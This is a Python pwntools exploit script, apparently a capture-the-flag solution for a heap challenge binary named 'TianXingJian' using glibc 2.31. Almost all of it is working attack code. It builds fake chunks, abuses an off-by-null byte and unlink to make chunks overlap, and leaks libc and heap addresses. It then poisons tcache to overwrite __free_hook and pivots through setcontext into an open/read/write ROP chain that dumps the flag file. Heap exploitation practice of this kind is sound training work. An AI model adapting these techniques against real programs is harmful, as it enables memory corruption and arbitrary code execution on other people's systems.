from pwn import *

context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

p = process('./TianXingJian')
# p = remote('challenges.hazmat.buptmerak.cn', 20004)
# p = remote('127.0.0.1', 8999)
# attachment = ELF('./')
libc = ELF('./libc-2.31.so')

def create(size, content):
    p.sendlineafter(b'choice:', b'1')
    p.sendlineafter(b'write?', str(size).encode())
    p.sendafter(b'begin.', content)

def delete(id):
    p.sendlineafter(b'choice:', b'2')
    p.sendlineafter(b'delete?', str(id).encode())

def browse(id):
    p.sendlineafter(b'choice:', b'3')
    p.sendlineafter(b'see?', str(id).encode())

while True:
    try:
        for i in range(14):
            create(0x10, b'a')
        create(0x50, b'a')
        for i in range(13):
            create(0x60, b'a')
        for i in range(8):
            create(0x70, b'a')
        for i in range(4):
            create(0xc0, b'a')
        for i in range(2):
            create(0xe0, b'a')
        for i in range(7):
            create(0x28, b'f')
        create(0x3080, b'./flag') # 49
        # ----------分割战场----------

        # get a fake chunk *in* number 52
        create(0xbf0, b'50')
        create(0x20, b'51')
        delete(50)
        create(0x1000, b'50')
        create(0x28, p64(0) + p64(0x521) + b'\x90') # 52

        # FAKE.fd->bk = FAKE, FAKE.fd is number 55
        create(0x28, b'53')
        create(0x28, b'54')
        create(0x28, b'55')
        create(0x28, b'56')
        for i in range(7):
            delete(42 + i)
        delete(53)
        delete(55)
        for i in range(7):
            create(0x28, b'f')
        create(0x400, b'53')
        create(0x28, p64(0) + b'\x10') # 55
        create(0x28, b'57')
        # 52 57 54 55 56 53(0x400)

        # FAKE.bk->fd = FAKE, FAKE.bk is number 52, whitch contains the fake chunk
        for i in range(7):
            delete(42 + i)
        delete(54)
        delete(52)
        for i in range(7):
            create(0x28, b'f')
        create(0x28, b'\x10') # 52
        create(0x28, b'54')

        # off by null + unlink = chunk overlap
        create(0x28, b'58')
        create(0x5f8, b'59')
        create(0xc0, b'60') # clean the bins
        delete(58)
        create(0x28, p64(0) * 4 + p64(0x520))
        delete(59)

        # get libc
        create(0x10, b'59')
        browse(57)
        p.recvline()
        libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x1ecbe0
        free_hook_addr = libc_base + libc.symbols['__free_hook']
        print(hex(libc_base), hex(free_hook_addr))
        # gdb.attach(p)

        # get heap
        create(0xb0, b'61')
        create(0x28, b'62') # 62 = 53
        create(0x28, b'63')
        delete(63)
        delete(62)
        browse(53) # Don't let '\x00' appear in the address
        p.recvline()
        heap_addr = u64(p.recv(6).ljust(8, b'\x00'))
        print(hex(heap_addr))
        create(0x28, b'62')
        create(0x28, b'63')

        # let __free_hook be the magic gadget
        magic_gadget = libc_base + 0x151bb0
        for i in range(7):
            delete(42 + i)
        delete(62)
        delete(63)
        delete(53) # 53 = 62
        for i in range(7):
            create(0x28, b'f')
        create(0x28, p64(free_hook_addr))
        create(0x28, b'63')
        create(0x28, b'62')
        create(0x28, p64(magic_gadget)) # 64

        # orw
        pop_rdi_ret = libc_base + 0x23b6a
        pop_rsi_ret = libc_base + 0x2601f
        pop_rax_rdx_rbx_ret = libc_base + 0x15fae5
        syscall_ret = libc_base + 0x630a9
        setcontext_addr = libc_base + libc.symbols['setcontext']
        frame = SigreturnFrame()
        frame.rax = 0
        frame.rdi = 0
        frame.rsi = heap_addr + 0x2d0
        frame.rdx = 0x1000
        frame.rsp = heap_addr + 0x2d0
        frame.rip = syscall_ret
        create(0x100, p64(0) * 4 + p64(setcontext_addr + 61) + bytes(frame)[0x28:]) # 65
        create(0x20, p64(0) + p64(heap_addr + 0x30)) # 66
        # gdb.attach(p, 'b *Delete+164')
        delete(66)

        payload = b''
        payload += p64(pop_rdi_ret) + p64(heap_addr - 0x31b0)
        payload += p64(pop_rsi_ret) + p64(0)
        payload += p64(pop_rax_rdx_rbx_ret) + p64(2) + p64(7) + p64(0)
        payload += p64(syscall_ret)

        payload += p64(pop_rdi_ret) + p64(3)
        payload += p64(pop_rsi_ret) + p64(heap_addr - 0x3000)
        payload += p64(pop_rax_rdx_rbx_ret) + p64(0) + p64(0x100) + p64(0)
        payload += p64(syscall_ret)

        payload += p64(pop_rdi_ret) + p64(1)
        payload += p64(pop_rsi_ret) + p64(heap_addr - 0x3000)
        payload += p64(pop_rax_rdx_rbx_ret) + p64(1) + p64(0x100) + p64(0)
        payload += p64(syscall_ret)
        p.send(payload)
        p.recvline()
    except:
        flag = p.recv()
        if b'flag' in flag:
            print(flag)
            exit(0)
        else:
            p.close()
            p = process('./TianXingJian')
            # p = remote('challenges.hazmat.buptmerak.cn', 20004)
            # p = remote('127.0.0.1', 8999)